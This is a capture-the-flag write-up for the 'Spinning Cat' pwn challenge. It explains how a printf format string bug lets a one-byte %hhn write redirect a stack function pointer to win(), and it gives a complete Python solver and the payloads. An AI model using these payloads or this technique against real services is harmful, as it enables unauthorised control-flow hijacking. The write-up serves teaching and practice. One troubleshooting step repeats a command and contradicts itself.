---
title: "Spinning Cat"
summary: "UMCS Preliminary umcs preliminary, reverse engineering, binary exploitation writeup covering Spinning Cat with analysis, solution steps, and final recovery notes."
date: 2026-04-26
tags:
  - ctf
  - umcs-preliminary
  - reverse-engineering
  - binary-exploitation
  - boot2root
category: "local-ctf"
difficulty: "medium"
platform: "ctf"
draft: false
boxImage: "https://umcybersec.site/assets/logo-BsYk-M08.png"
---
# Challenge Overview

**Challenge Name:** Spinning Cat
**Category:** Pwn
**Points:** 400
**Flag Format:** `UMCS{}`

The challenge provided a Linux ELF binary named `spinning_cat`, along with the matching runtime files:

```txt
spinning_cat
libc.so.6
ld-linux-x86-64.so.2
```

The challenge also included a YouTube reference to a spinning cat video, which acts mainly as theme/flavor. The actual objective is to analyze the binary, identify the vulnerability, exploit it against the remote service, and retrieve the flag.

The remote service used during solving was:

```bash
chal.umcybersec.site 10429
```

The final recovered flag was:

```txt
UMCS{0I1A_o11a_O11A_0i1A_OIIA_0114}
```

---

# Initial Analysis

The first step is to inspect the binary.

```bash
file spinning_cat
```

Expected result:

```txt
spinning_cat: ELF 64-bit LSB pie executable, x86-64
```

Then check the binary protections:

```bash
checksec --file=spinning_cat
```

The relevant protections are:

```txt
RELRO:    Full RELRO
Canary:   Canary found
NX:       NX enabled
PIE:      PIE enabled
```

This means:

- **Full RELRO** prevents overwriting GOT entries.

- **Stack canary** makes classic stack buffer overflow harder.

- **NX** prevents executing shellcode on the stack.

- **PIE** randomizes the binary base address.


So a basic ret2win overwrite is not immediately available through a simple buffer overflow.

Running the binary locally shows that it asks for input:

```bash
./ld-linux-x86-64.so.2 --library-path . ./spinning_cat
```

Example behavior:

```txt
Adjust the frequency:
```

When format string payloads are sent, the program prints stack values:

```txt
%p.%p.%p.%p
```

This confirms that user-controlled input is being passed directly into `printf()`.

A simplified vulnerable logic looks like this:

```c
char buf[256];
void (*func_ptr)() = sing_oiia;

fgets(buf, sizeof(buf), stdin);
printf(buf);

func_ptr();
```

The binary also contains a hidden `win()` function. From reverse engineering:

```txt
win       = 0x1251
sing_oiia = 0x12ee
```

The default function pointer calls `sing_oiia()`, but the goal is to redirect it to `win()`.

---

# Vulnerability / Weakness Identification

The core vulnerability is a **format string vulnerability**.

The program does something equivalent to:

```c
printf(user_input);
```

instead of:

```c
printf("%s", user_input);
```

This allows the attacker to:

1. Leak stack values using format specifiers such as `%p`.

2. Write arbitrary byte-sized values using `%hhn`.

3. Modify memory addresses placed on the stack as format string arguments.


The important stack leaks discovered during testing were:

```txt
%7$p   leaks the current function pointer value
%33$p  leaks a stable stack address
```

Example leak:

```txt
0x5c23e75072ee.0x7ffd42b205e8
```

The first value ends with:

```txt
0x2ee
```

This matches the offset of `sing_oiia()`:

```txt
sing_oiia = 0x12ee
```

The target function, `win()`, ends with:

```txt
0x251
```

Because PIE bases are page-aligned, the low 12 bits of function offsets remain predictable. Therefore:

```txt
sing_oiia = ...2ee
win       = ...251
```

Only the lowest byte needs to change:

```txt
0xee -> 0x51
```

This can be achieved with a one-byte write using `%hhn`.

The function pointer itself is stored on the stack. From local debugging and testing, the pointer slot is located at:

```txt
target = leaked_stack_address - 0x260
```

So the exploit only needs to write byte `0x51` to that stack address.

---

# Exploitation Strategy

The exploit strategy is:

1. Start the process locally or connect to the remote service.

2. Wait for the prompt:


```txt
Adjust the frequency:
```

3. Send a leak payload:


```txt
%7$p.%33$p
```

4. Parse the output:

    - `%7$p` gives the current function pointer value.

    - `%33$p` gives a stack leak.

5. Compute the address of the function pointer slot:


```python
target = stack_leak - 0x260
```

6. Build a format string payload that writes one byte:


```txt
%81c%12$hhn
```

Explanation:

- `0x51` in decimal is `81`.

- `%81c` prints 81 characters.

- `%hhn` writes the number of printed characters as a single byte.

- Therefore, `%hhn` writes `0x51`.


7. Place the target address after the format string so that it becomes the 12th format argument:


```python
payload = b"%81c%12$hhn"
payload += b"A" * (32 - len(payload))
payload += p64(target)
```

8. After `printf()` performs the write, the program calls the function pointer.

9. The pointer now points to `win()`.

10. `win()` prints the flag.


This avoids the need for:

- shellcode,

- libc ROP,

- GOT overwrite,

- stack return address overwrite.


The exploit only abuses the format string bug and the stack-stored function pointer.

---

# Proof of Concept

A minimal manual leak test:

```bash
python3 solve_spinning_cat.py chal.umcybersec.site 10429
```

The leak phase produces output similar to:

![pasted-image-20260427001941](/images/writeups/local-ctf/umcs-preliminary/binary-spinning-cat/pasted-image-20260427001941.png)

The solver calculates:

```txt
func leak  = 0x5c23e75072ee
stack leak = 0x7ffd42b205e8
target     = 0x7ffd42b20388
```

Then it sends the overwrite payload.

Successful output:

```txt
[!] OIIA OIIA OIIA OIIA OIIA OIIA: UMCS{0I1A_o11a_O11A_0i1A_OIIA_0114}
```

---

# Full Python Solver

Save the following script as `solve_spinning_cat.py`.

```python
#!/usr/bin/env python3
import os
import re
import sys
import time
import socket
import struct
import subprocess

# Local challenge files
BIN = "./spinning_cat"
LD = "./ld-linux-x86-64.so.2"

# Prompt shown by the binary
PROMPT = b"Adjust the frequency: "


def p64(value):
    """
    Pack a 64-bit integer into little-endian format.
    """
    return struct.pack("<Q", value)


class Tube:
    """
    Small wrapper class to support both local and remote execution
    without requiring pwntools.
    """

    def __init__(self, host=None, port=None):
        self.remote = host is not None

        if self.remote:
            self.s = socket.create_connection((host, int(port)))
            self.s.settimeout(3)
        else:
            self.p = subprocess.Popen(
                [LD, "--library-path", ".", BIN],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                cwd=os.getcwd()
            )

    def send(self, data):
        if self.remote:
            self.s.sendall(data)
        else:
            self.p.stdin.write(data)
            self.p.stdin.flush()

    def recv(self, n=1):
        if self.remote:
            return self.s.recv(n)
        return self.p.stdout.read(n)

    def recvall(self, timeout=3):
        """
        Receive remaining output until timeout.
        """
        end = time.time() + timeout
        data = b""

        while time.time() < end:
            try:
                if self.remote:
                    chunk = self.s.recv(4096)
                else:
                    chunk = self.p.stdout.read(1)

                if not chunk:
                    break

                data += chunk

            except Exception:
                break

        return data


def recvuntil(io, marker, timeout=5):
    """
    Receive data until a specific marker is found.
    """
    end = time.time() + timeout
    data = b""

    while marker not in data:
        if time.time() > end:
            raise TimeoutError(data.decode(errors="ignore"))

        data += io.recv(1)

    return data


def parse_args():
    """
    Supports the following usage styles:

    Local:
        python3 solve_spinning_cat.py

    Remote:
        python3 solve_spinning_cat.py chal.umcybersec.site 10429

    Remote alternative:
        python3 solve_spinning_cat.py HOST=chal.umcybersec.site PORT=10429
    """
    if len(sys.argv) == 1:
        return None, None

    host = None
    port = None

    for arg in sys.argv[1:]:
        if arg.startswith("HOST="):
            host = arg.split("=", 1)[1]
        elif arg.startswith("PORT="):
            port = arg.split("=", 1)[1]

    if host and port:
        return host, int(port)

    if len(sys.argv) == 3:
        return sys.argv[1], int(sys.argv[2])

    print("Usage:")
    print(f"  Local : python3 {sys.argv[0]}")
    print(f"  Remote: python3 {sys.argv[0]} chal.umcybersec.site 10429")
    print(f"  Remote: python3 {sys.argv[0]} HOST=chal.umcybersec.site PORT=10429")
    sys.exit(1)


def exploit():
    host, port = parse_args()

    # Start local process or connect to remote service
    io = Tube(host, port)

    # Wait for the first prompt
    recvuntil(io, PROMPT)

    # Leak two useful addresses:
    #
    # %7$p  -> current function pointer value
    # %33$p -> stable stack leak
    io.send(b"%7$p.%33$p\n")

    leak_output = recvuntil(io, PROMPT)
    print(leak_output.decode(errors="ignore"))

    # Extract leaked hexadecimal values
    match = re.search(rb"(0x[0-9a-fA-F]+)\.(0x[0-9a-fA-F]+)", leak_output)

    if not match:
        print("[-] Failed to parse leaked addresses")
        sys.exit(1)

    func_leak = int(match.group(1), 16)
    stack_leak = int(match.group(2), 16)

    # The stack leak is consistently 0x260 bytes above the function pointer slot.
    target = stack_leak - 0x260

    print(f"[+] func leak  = {hex(func_leak)}")
    print(f"[+] stack leak = {hex(stack_leak)}")
    print(f"[+] target     = {hex(target)}")

    # Function offsets:
    #
    # sing_oiia = 0x12ee
    # win       = 0x1251
    #
    # Because PIE is page-aligned, only the lowest byte needs changing:
    #
    # 0xee -> 0x51
    #
    # 0x51 decimal is 81.
    #
    # %81c      prints 81 characters
    # %12$hhn   writes one byte, 0x51, to the address stored as argument 12
    #
    # The address is placed after 32 bytes so it lands at the correct format
    # argument index.
    payload = b"%81c%12$hhn"
    payload += b"A" * (32 - len(payload))
    payload += p64(target)
    payload += b"\n"

    print(f"[+] sending payload length = {len(payload)}")

    # Send overwrite payload
    io.send(payload)

    # Print final output, which should include the flag
    final_output = io.recvall()
    print(final_output.decode(errors="ignore"))


if __name__ == "__main__":
    exploit()
```

---

# Walkthrough

## 1. Place all files in the same directory

The directory should contain:

```txt
spinning_cat
libc.so.6
ld-linux-x86-64.so.2
solve_spinning_cat.py
```

Example:

```bash
ls
```

Expected:

```txt
spinning_cat  libc.so.6  ld-linux-x86-64.so.2  solve_spinning_cat.py
```

## 2. Make files executable

```bash
chmod +x spinning_cat ld-linux-x86-64.so.2 solve_spinning_cat.py
```

## 3. Run locally

```bash
python3 solve_spinning_cat.py
```

Local output may show:

```txt
[!] Flag.txt not found!
```

This is normal if the local challenge directory does not contain `flag.txt`.

The local test is still useful because it confirms that control flow reaches `win()`.

## 4. Run against remote

Use:

```bash
python3 solve_spinning_cat.py chal.umcybersec.site 10429
```

Alternative supported syntax:

```bash
python3 solve_spinning_cat.py HOST=chal.umcybersec.site PORT=10429
```

Do not run it like this unless the script specifically supports that syntax:

```bash
python3 solve_spinning_cat.py HOST=chal.umcybersec.site PORT=10429
```

In this provided solver, both normal positional arguments and `HOST=... PORT=...` are supported.

## 5. Expected successful output

A successful run should look similar to this:

```txt
0x5c23e75072ee.0x7ffd42b205e8
IIOA AIIO IAIO OAII IOIA AOII! 🐱🌀

Adjust the frequency:

[+] func leak  = 0x5c23e75072ee
[+] stack leak = 0x7ffd42b205e8
[+] target     = 0x7ffd42b20388
[+] sending payload length = 41

[!] OIIA OIIA OIIA OIIA OIIA OIIA: UMCS{0I1A_o11a_O11A_0i1A_OIIA_0114}
```

## Troubleshooting

### Problem: `Permission denied`

Fix:

```bash
chmod +x spinning_cat ld-linux-x86-64.so.2 solve_spinning_cat.py
```

### Problem: `Flag.txt not found!`

This usually happens locally. The remote server contains the real flag file. Run the exploit remotely.

### Problem: `Failed to parse leaked addresses`

The leak payload did not return the expected format. Check that the service is still active and that the prompt is correct.

### Problem: Connection timeout

The CTF instance may have expired or restarted. Restart the instance and update the port if needed.

---

# Flag

The exploit successfully redirects execution from `sing_oiia()` to `win()` and prints the flag:

```txt
UMCS{0I1A_o11a_O11A_0i1A_OIIA_0114}
```

---

# Conclusion

The root cause of the challenge is an unsafe call to `printf()` using attacker-controlled input as the format string.

The binary stores a function pointer on the stack and later calls it. Because of the format string vulnerability, the attacker can leak stack addresses and then use `%hhn` to overwrite one byte of that function pointer.

Since the target function `win()` and the original function `sing_oiia()` are close together inside the PIE binary, only the lowest byte of the function pointer needs to be changed:

```txt
sing_oiia = ...2ee
win       = ...251
```

By writing `0x51` over the lowest byte, execution is redirected to `win()`, causing the program to print the flag.

Key lesson:

```txt
Never pass user-controlled input directly as the first argument to printf().
Always use printf("%s", user_input).
```
